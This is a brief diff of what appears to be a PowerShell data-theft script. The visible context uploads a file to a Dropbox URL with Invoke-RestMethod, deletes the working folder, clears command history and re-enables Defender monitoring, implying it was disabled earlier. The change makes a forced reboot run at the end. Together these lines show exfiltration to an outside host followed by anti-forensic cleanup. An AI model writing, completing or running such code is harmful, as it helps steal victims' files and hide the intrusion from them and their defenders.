@@ -99,6 +99,4 @@ Invoke-RestMethod -Uri $dropboxUploadUrl -Method POST -Headers $headers -Body $f
 Remove-Item -Path $dir -Recurse -Force
 Clear-History
 Set-MpPreference -DisableRealtimeMonitoring $false
-
-# Reboot the system
-#Restart-Computer -Force
+Restart-Computer -Force
